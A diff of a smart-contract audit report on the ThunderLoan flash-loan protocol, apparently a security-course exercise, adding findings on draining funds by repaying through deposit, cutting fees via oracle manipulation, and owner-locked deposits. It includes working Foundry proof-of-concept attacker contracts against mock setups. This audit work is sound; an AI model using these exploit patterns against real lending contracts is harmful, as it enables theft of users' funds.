@@ -66,7 +66,7 @@ function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) rev
 
 
 
-[H-1] TITLE (Root Cause -> Impact) There is storage collision happening between `ThunderLoan::s_flashLoanFee` and `ThunderLoanUpgraded::s_flashLoanFee`.
+[H-2] TITLE (Root Cause -> Impact) There is storage collision happening between `ThunderLoan::s_flashLoanFee` and `ThunderLoanUpgraded::s_flashLoanFee`.
 
 Description: The order of storage variables in the `ThunderLoan` is different from `ThunderLoanUpgraded`.
 
@@ -122,12 +122,283 @@ Receommended to add the following changes in your `ThunderLoanUpgraded` contract
 
 
 
-[H-3] TITLE (Root Cause -> Impact) 
+[H-3] TITLE (Root Cause -> Impact) The funds of the contract can be easily ftolen if the user returns the flash loan to `deposit` function.
 
-Description:
+Description: In the contract `ThunderLoan` any user can get a flash loan by calling the function `flashloan`, but the main issue in `flashloan` function as in the end it checks for the contract balance and it its less than the previous balance plus fee it reverts, but what if user repays the flash loan by calling the `deposit` function instead of `repay` function then the user can call the `withdraw` function and just withdraw the amount he deposited which is the flashloan amount plus fee and due to this an attacker can easily drain money from the contract.
 
-Impact:
+Impact: Attacker can easily wipe out all the money the contract has.
+
+Proof of Concept: 
+1. An user calls the `flashloan` function and get a flashloan.
+2. the flashloan amount is transfered to attackers contract where the function `executeOperation` gets called.
+3. The function has a code which says to call the `deposit` function and deposit the flashloan amount plus fee.
+4. Then the user can call the `withdraw` function and withdraw the money.
+
+Consider adding the below test code in `ThunderLoanTest.t.sol` file.
+
+```javascript
+function testUseDepositInsteadToRepayFunds() public setAllowedToken hasDeposits{
+        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
+        uint256 amountToBorrow = 50e18;
+        vm.startPrank(user);
+        tokenA.mint(address(dor),1e18);
+        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
+        dor.redeemMoney();
+        vm.stopPrank();
+        assert(tokenA.balanceOf(address(dor)) > amountToBorrow);
+    }
+
+contract DepositOverRepay is IFlashLoanReceiver {
+
+    IERC20 s_token;
+    ThunderLoan thunderLoan;
+    uint256 s_amount;
+
+    constructor(address _thunderLoan) {
+    thunderLoan = ThunderLoan(_thunderLoan);
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address ,
+        bytes calldata 
+    ) external returns (bool){
+        s_token = IERC20(token);
+        s_amount = amount;
+        IERC20(token).approve(address(thunderLoan),100e18);
+        thunderLoan.deposit(s_token, amount+fee);
+        return true;
+    }
+
+    function redeemMoney() external{
+        thunderLoan.redeem(s_token, 49e18);
+    }
+
+}
+
+
+```
+
+Recommended Mitigation: Add a check in deposit() to make it impossible to use it in the same block of the flash loan. For example registring the block.number in a variable in flashloan() and checking it in deposit().
+
+
+
+
+[H-4] TITLE (Root Cause -> Impact) Attacker can minimize ThunderLoan::flashloan fee via price oracle manipulation
+
+Description: In the function `flashloan` the fee is calculated by calling the function `getCalculatedFee`, which calls the function `getPriceInWeth` and uses the priceFeed from some TSwap which is similar to Uniswap. So if an attacker deposits a big amount of weth or poolToken to the TSwap contract then the price will definitily fluctuate depending on the amount and type of token user deposits, which will surely have impact on the fee being calculated in `ThunderLoan` contract.
+
+```javascript
+function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
+        //slither-disable-next-line divide-before-multiply
+        uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
+        //slither-disable-next-line divide-before-multiply
+        fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
+    }
+```
+
+Impact: An attacker will have to pay less fees in for getting the flashloan by calling the `flashLoan` function.
 
 Proof of Concept:
+The attacking contract implements an executeOperation function which, when called via the ThunderLoan contract, will perform the following sequence of function calls:
 
-Recommended Mitigation:
+1. Calls the mock pool contract to set the price (simulating manipulating the price)
+2. Repay the initial loan
+3. Re-calls flashloan, taking a large loan now with a reduced fee
+4. Repay second loan.
+
+Consider adding the below test code and contract in your `ThunderLoan.sol` file.
+
+```javascript
+
+
+function testOracleManipulationHappening() public {
+        thunderLoan = new ThunderLoan();
+        ERC1967Proxy proxy = new ERC1967Proxy(address(thunderLoan), "");
+        address liquidator = makeAddr("liquidator");
+        ERC20Mock weth = new ERC20Mock();
+        ERC20Mock tokenA = new ERC20Mock();
+        BuffMockPoolFactory poolFactory = new BuffMockPoolFactory(
+            address(weth)
+        );
+        poolFactory.createPool(address(tokenA));
+        address pool = poolFactory.getPool(address(tokenA));
+        thunderLoan = ThunderLoan(address(proxy));
+        thunderLoan.initialize((address(poolFactory)));
+
+        vm.startPrank(liquidator);
+        weth.mint(liquidator, 110e18);
+        tokenA.mint(liquidator, 110e18);
+        weth.approve(address(pool), 110e18);
+        tokenA.approve(address(pool), 110e18);
+        BuffMockTSwap(pool).deposit(
+            100e18,
+            100e18,
+            100e18,
+            uint64(block.timestamp)
+        );
+        vm.stopPrank();
+
+        vm.prank(thunderLoan.owner());
+        thunderLoan.setAllowedToken((tokenA), true);
+
+        address thunderLiquidator = makeAddr("thunderLiquidator");
+        vm.startPrank(thunderLiquidator);
+        tokenA.mint(thunderLiquidator, 110e18);
+        tokenA.approve(address(thunderLoan), 110e18);
+        thunderLoan.deposit((tokenA), 100e18);
+        uint256 calculatedFeeNormal = thunderLoan.getCalculatedFee(
+            tokenA,
+            100e18
+        );
+        vm.stopPrank();
+        console.log("calculatedFeeNormal: ", calculatedFeeNormal);
+
+        MaliciousFlashLoanReceiver mali = new MaliciousFlashLoanReceiver(
+            address(pool),
+            address(thunderLoan),
+            address(thunderLoan.getAssetFromToken(tokenA))
+        );
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        tokenA.mint(address(mali),100e18);
+        weth.mint(attacker, 10e18);
+        tokenA.mint(attacker, 10e18);
+        thunderLoan.flashloan(address(mali), tokenA, 50e18, "");
+        vm.stopPrank();
+        uint256 endingtotalFees = mali.feeOne() + mali.feeTwo();
+        console.log("endingtotalFees",endingtotalFees);
+        assert(endingtotalFees < calculatedFeeNormal);
+    }
+
+
+
+contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
+    BuffMockTSwap tswap;
+    ThunderLoan thunderLoan;
+    address repayAddress;
+    uint256 public feeOne;
+    uint256 public feeTwo;
+
+    bool attacked;
+
+    constructor(
+        address _tswapPool,
+        address _thunderLoan,
+        address _repayAddress
+    ) {
+        tswap = BuffMockTSwap(_tswapPool);
+        thunderLoan = ThunderLoan(_thunderLoan);
+        repayAddress = _repayAddress;
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address initiator,
+        bytes calldata params
+    ) external returns (bool) {
+        if (!attacked) {
+            feeOne = fee;
+            attacked = true;
+            uint256 expected = tswap.getOutputAmountBasedOnInput(
+                50e18,
+                100e18,
+                100e18
+            );
+            IERC20(token).approve(address(tswap), 50e18);
+            tswap.swapPoolTokenForWethBasedOnInputPoolToken(
+                50e18,
+                expected,
+                block.timestamp
+            );
+            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
+            IERC20(token).transfer(address(repayAddress), amount + feeOne);
+        } else {
+            feeTwo = fee;
+            IERC20(token).transfer(address(repayAddress), amount + feeOne);
+        }
+        return true;
+    }
+
+}
+
+```
+
+Recommended Mitigation: Consider using a manipulation-resistant oracle such as Chainlink priceFeed.
+
+
+
+
+
+
+
+[M-1] TITLE (Root Cause -> Impact) `ThunderLoan::setAllowedToken` can permanently lock liquidity providers out from redeeming their tokens
+
+Description: If the owner of the contract calls the function `ThunderLoan::setAllowedToken` and sets any allowed token to false, this will delete the token from the mapping and any user who deposited this type of token will not be able to redeem them.
+
+Impact: 
+
+Proof of Concept: 
+1. User deposits any allowed token by calling deposit.
+2. The owner of the contract sets the token to false by calling `ThunderLoan::setAllowedToken`.
+
+Consider adding the following test in `ThunderLoanTest.t.sol`.
+
+<details>
+<summary>Proof of Code</summary>
+
+```javascript
+function testUserCannotRedeemDepositedTokens() public {
+        vm.prank(thunderLoan.owner());
+        thunderLoan.setAllowedToken(tokenA, true);
+        address may = makeAddr("may");
+        vm.startPrank(may);
+        tokenA.mint(may,10e18);
+        tokenA.approve(address(thunderLoan),10e18);
+        thunderLoan.deposit(tokenA, 5e18);
+        vm.stopPrank();
+        vm.prank(thunderLoan.owner());
+        thunderLoan.setAllowedToken(tokenA, false);
+        vm.prank(may);
+        vm.expectRevert();
+        thunderLoan.redeem(tokenA, 5e18);
+    }
+```
+
+</details>
+
+
+Recommended Mitigation: Consider adding a check in the function `setAllowedToken` whic says if the balance of that token is more than zero, then that token can never get disabled.
+
+
+```diff
+function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
+        if (allowed) {
+            if (address(s_tokenToAssetToken[token]) != address(0)) {
+                revert ThunderLoan__AlreadyAllowed();
+            }
+            string memory name = string.concat("ThunderLoan ", IERC20Metadata(address(token)).name());
+            string memory symbol = string.concat("tl", IERC20Metadata(address(token)).symbol());
+            AssetToken assetToken = new AssetToken(address(this), token, name, symbol);
+            s_tokenToAssetToken[token] = assetToken;  
+            emit AllowedTokenSet(token, assetToken, allowed);
+            return assetToken;
+        } else {
+            AssetToken assetToken = s_tokenToAssetToken[token];
+-           delete s_tokenToAssetToken[token];
+-           emit AllowedTokenSet(token, assetToken, allowed);
++           uint256 tokenBalance = IERC20(token).balanceOf(address(assetToken));
++           if(tokenBalance == 0){
++           delete s_tokenToAssetToken[token];
++           emit AllowedTokenSet(token, assetToken, allowed);
++           }
+            return assetToken;
+        }
+    }
+
+```
+
